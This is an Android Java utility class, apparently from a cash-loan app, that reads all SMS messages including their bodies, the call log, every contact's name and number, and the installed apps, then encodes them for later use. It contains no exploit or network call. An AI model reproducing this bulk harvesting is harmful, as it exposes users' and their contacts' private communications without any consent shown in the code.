package com.tiny.cash.loan.card.utils;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;

import com.tiny.cash.loan.card.ui.bean.CallInfo;
import com.tiny.cash.loan.card.ui.bean.ContactInfo;
import com.tiny.cash.loan.card.ui.bean.InstallPackageInfo;
import com.tiny.cash.loan.card.ui.bean.SmsInfo;

import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import co.paystack.android.utils.StringUtils;

/**
 * *作者: jyw
 * 日期：2020/10/22 10:01
 */
public class PhoneInfoContent {
    private static final String TAG = "PhoneInfoContent";
    private Activity activity;
    List<SmsInfo> mSmsInfoList;
    List<CallInfo> mCallInfoList;
    List<ContactInfo> mContactInfoList;
    /**
     * 所有的短信
     */
    public static final String SMS_URI_ALL = "content://sms/";
    /**
     * 收件箱短信
     */
    public static final String SMS_URI_INBOX = "content://sms/inbox";
    /**
     * 发件箱短信
     */
    public static final String SMS_URI_SEND = "content://sms/sent";
    /**
     * 草稿箱短信
     */
    public static final String SMS_URI_DRAFT = "content://sms/draft";

    public PhoneInfoContent(Activity activity) {
        this.activity = activity;
    }

    /**
     * Role:获取短信的各种信息 <BR>
     * Date:2012-3-19 <BR>
     *
     * @author CODYY)peijiangping
     */

    public List<SmsInfo> getSmsInfo() {
        try {
            mSmsInfoList = new ArrayList<>();
            Uri uri = Uri.parse(SMS_URI_ALL);
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type", "read", "status"};
            Cursor cusor = activity.getContentResolver().query(uri, projection, null, null, "date desc");
            int readColumn = cusor.getColumnIndex("read");
            int phoneNumberColumn = cusor.getColumnIndex("address");
            int body = cusor.getColumnIndex("body");
            int dateColumn = cusor.getColumnIndex("date");
            int status = cusor.getColumnIndex("status");
            int typeColumn = cusor.getColumnIndex("type");
            if (cusor != null) {
                while (cusor.moveToNext()) {
                    SmsInfo smsinfo = new SmsInfo();
                    smsinfo.setTime(cusor.getString(dateColumn));
                    smsinfo.setAddr(Utils.encodeData(cusor.getString(phoneNumberColumn)));
                    smsinfo.setBody(Utils.encodeData(processUtil(cusor.getString(body))));
                    smsinfo.setType(cusor.getString(typeColumn));
                    smsinfo.setRead(cusor.getString(readColumn));
                    smsinfo.setStatus(cusor.getString(status));
                    mSmsInfoList.add(smsinfo);
                }
            }
        } catch (Exception exception) {

        }
        return mSmsInfoList;
    }


    /**
     * 把其中的英文双引号变成中文
     *
     * @param str 需要替換的字符串
     * @return
     */
    public static String processUtil(String str) {
        if (StringUtils.isEmpty(str)) {
            return null;
        }
        String regex = "(.*)\"(.*)\"(.*)";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(str);
        while (matcher.find()) {
            str = matcher.group(1) + "“" + matcher.group(2) + "”" + matcher.group(3);
            matcher = pattern.matcher(str);
        }
        return str;
    }

    private static String processQuotationMarks(String content) {
        String regex = "\"([^\"]*)\"";
        Pattern pattern = Pattern.compile(regex);
        Matcher matcher = pattern.matcher(content);

        String reCT = content;

        while (matcher.find()) {
            String itemMatch = "“" + matcher.group(1) + "”";
            reCT = reCT.replace("\"" + matcher.group(1) + "\"", itemMatch);
        }

        return reCT;
    }

    private Uri callUri = CallLog.Calls.CONTENT_URI;
    private String[] columns = {CallLog.Calls.CACHED_NAME// 通话记录的联系人
            , CallLog.Calls.NUMBER// 通话记录的电话号码
            , CallLog.Calls.DATE// 通话记录的日期
            , CallLog.Calls.DURATION// 通话时长
            , CallLog.Calls.TYPE};// 通话类型}

    /**
     * 获取通话记录
     */

    public List<CallInfo> getContentCallLog() {

        mCallInfoList = new ArrayList<>();
        try {
            Cursor cursor = activity.getContentResolver().query(callUri, // 查询通话记录的URI
                    columns, null, null, CallLog.Calls.DEFAULT_SORT_ORDER// 按照时间逆序排列，最近打的最先显示
            );
            Log.i(TAG, "cursor count:" + cursor.getCount());
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));  //姓名
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));  //号码
                    long dateLong = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE)); //获取通话日期
                    String date =
                            new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(dateLong));
                    String time = new SimpleDateFormat("HH:mm").format(new Date(dateLong));
                    int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    //获取通话时长，值为多少秒
                    int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE)); //获取通话类型：1.呼入2
                    // .呼出3.未接
                    //            String dayCurrent = new SimpleDateFormat("dd").format(new Date());
                    //            String dayRecord = new SimpleDateFormat("dd").format(new Date
                    //            (dateLong));
                    CallInfo callInfo = new CallInfo();
                    if (!StringUtils.isEmpty(name)) {
                        callInfo.setName(Utils.encodeData(name));
                    }
                    callInfo.setDate(date);
                    callInfo.setDuration(duration);
                    callInfo.setNumber(Utils.encodeData(number));
                    callInfo.setType(type);
                    mCallInfoList.add(callInfo);
                }

            }
        } catch (Exception e) {
        }

        return mCallInfoList;
    }

    /**
     * 获取联系人
     */
    public List<ContactInfo> getConnect() {
        try {

            mContactInfoList = new ArrayList<>();
            Cursor cursor =
                    activity.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, new String[]{"display_name", "sort_key", "contact_id", "data1"}, null, null, null);
            Log.i(TAG, "cursor connect count:" + cursor.getCount());
            //        moveToNext方法返回的是一个boolean类型的数据
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    //读取通讯录的姓名
                    String name =
                            cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    //读取通讯录的号码
                    String phoneNum =
                            cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    if (phoneNum != null) {
                        phoneNum = phoneNum.replaceAll("-", " ");
                        // 空格去掉  为什么不直接-替换成"" 因为测试的时候发现还是会有空格 只能这么处理
                        phoneNum = phoneNum.replaceAll(" ", "");
                        ContactInfo contactInfo = new ContactInfo();
                        contactInfo.setName(Utils.encodeData(name));
                        contactInfo.setNumber(Utils.encodeData(phoneNum));
                        mContactInfoList.add(contactInfo);
                    }

                }

            }
        } catch (Exception exception) {

        }
        return mContactInfoList;
    }


    @SuppressLint("WrongConstant")
    public List<InstallPackageInfo> getInstalledPackages() {
        List<InstallPackageInfo> mInstallList = new ArrayList<>();
        PackageManager pm = activity.getPackageManager();
        //List<PackageInfo> mPackageinfo=  pm.getInstalledPackages(PackageManager.GET_PERMISSIONS);
        Intent query = new Intent(Intent.ACTION_MAIN);
        query.addCategory("android.intent.category.LAUNCHER");
        List<ResolveInfo> resolves = pm.queryIntentActivities(query, PackageManager.GET_ACTIVITIES);
        for (int i = 0; i < resolves.size(); i++) {
            ResolveInfo info = resolves.get(i);

            //判断是否为系统级应用
            if ((info.activityInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) <= 0) {
                /*安装的应用*/
                String[] permission;
                try {
                    InstallPackageInfo installPackageInfo = new InstallPackageInfo();
                    String name = info.activityInfo.loadLabel(pm).toString();
                    Drawable iconDrawable = info.activityInfo.loadIcon(pm);
                    String packagename = info.activityInfo.packageName;
                    permission = pm.getPackageInfo(info.activityInfo.packageName,
                            PackageManager.GET_PERMISSIONS).requestedPermissions;//获取权限列表

                    PackageInfo packageInfo = pm.getPackageInfo(packagename, 0);
                    //应用装时间
                    long firstInstallTime = packageInfo.firstInstallTime;
                    String local2UTC = TimeUtil.Local2UTC(firstInstallTime);
                    //应用最后一次更新时间
                    long lastUpdateTime = packageInfo.lastUpdateTime;
                    installPackageInfo.setInstalltime(TimeUtil.format(firstInstallTime));
                    installPackageInfo.setInstalltime_utc(local2UTC);
                    installPackageInfo.setTimestamps(TimeUtil.dateToStamp(TimeUtil.stampToDate(firstInstallTime)));
                    installPackageInfo.setAppname(Utils.encodeData(name));
                    installPackageInfo.setPkgname(Utils.encodeData(packagename));
                    installPackageInfo.setType("1");
                    mInstallList.add(installPackageInfo);
                } catch (PackageManager.NameNotFoundException e) {
                    // TODO Auto-generated catch block
                    e.printStackTrace();
                }

//            } else {
//                /*系统应用*/
//                String packagename = info.loadLabel(pm).toString();
//                String[] permission;
//                try {
//                    InstallPackageInfo installPackageInfo = new InstallPackageInfo();
//                    String name = info.activityInfo.loadLabel(pm).toString();
//                    Drawable iconDrawable = info.activityInfo.loadIcon(pm);
//                    permission = pm.getPackageInfo(info.activityInfo.packageName,
//                            PackageManager.GET_PERMISSIONS).requestedPermissions;//获取权限列表
//                    PackageInfo packageInfo = pm.getPackageInfo(packagename, 0);
//                    //应用装时间
//                    long firstInstallTime = packageInfo.firstInstallTime;
//                    String local2UTC = TimeUtil.Local2UTC(firstInstallTime);
//                    //应用最后一次更新时间
//                    long lastUpdateTime = packageInfo.lastUpdateTime;
//                    installPackageInfo.setInstalltime(TimeUtil.format(firstInstallTime));
//                    installPackageInfo.setInstalltime_utc(local2UTC);
//                    installPackageInfo.setTimestamps(TimeUtil.dateToStamp(TimeUtil.stampToDate(firstInstallTime)));
//                    installPackageInfo.setAppname(name);
//                    installPackageInfo.setPkgname(packagename);
//                    installPackageInfo.setType("0");
//                    mInstallList.add(installPackageInfo);
//                } catch (PackageManager.NameNotFoundException e) {
//                    // TODO Auto-generated catch block
//                    e.printStackTrace();
//                }
            }
        }
        return mInstallList;
    }
}
